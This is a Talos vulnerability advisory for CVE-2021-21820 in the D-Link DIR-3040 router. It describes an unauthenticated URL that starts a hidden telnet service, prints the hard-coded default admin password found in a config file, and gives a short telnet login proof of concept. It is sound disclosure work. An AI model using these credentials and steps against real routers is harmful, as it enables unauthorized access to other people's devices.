# Talos Vulnerability Report

### TALOS-2021-1285

## D-LINK DIR-3040 Libcli test environment hard-coded password vulnerability

##### July 15, 2021

##### CVE Number

CVE-2021-21820

### Summary

A hard-coded password vulnerability exists in the Libcli Test Environment functionality of D-LINK DIR-3040 1.13B03. A specially crafted network request can lead to code execution. An attacker can send a sequence of requests to trigger this vulnerability.

### Tested Versions

D-LINK DIR-3040 1.13B03

### Product URLs

<https://us.dlink.com/en/products/dir-3040-smart-ac3000-high-power-wi-fi-tri-band-gigabit-router>

### CVSSv3 Score

10.0 - CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

### CWE

CWE-798 - Use of Hard-coded Credentials

### Details

The DIR-3040 is an AC3000-based wireless internet router.

A hidden telnet service can be started without authentication by visiting

```
https://<router_ip>/start_telnet

```

This service presents the user with a login prompt for their “libcli test environment”:

```
$ telnet 192.168.0.1
          Trying 192.168.0.1...
          Connected to 192.168.0.1.
          Escape character is '^]'.
          dlinkrouter login: admin
          Password:

```

From here, a user can interact with the Libcli environment using their password with the static-salt discussed in this series of vulnerabilites.

While this is typically the same password that was created using the setup wizard, a default password can be used to login before this is changed.

The current password at any time can be found unencrypted in `/var/2860_data.dat`. There is a default password that will allow you to access the `Libcli test environment` via `telnet`.

* $ head /var/2860\_data.dat
  Default
  WorkMode=WirelessRouter
  IcapMode=0
  WebInit=1
  DBDC\_MODE=1
  HostName=Mediatek
  Login=admin
  Password=DIRrqtq\*@twsz
  OperationMode=1
  boost\_mode=auto

### Exploit Proof of Concept

```
$ telnet 192.168.100.1
Trying 192.168.100.1...
Connected to 192.168.100.1.
Escape character is '^]'.
dlinkrouter login: admin
Password:
libcli test environment
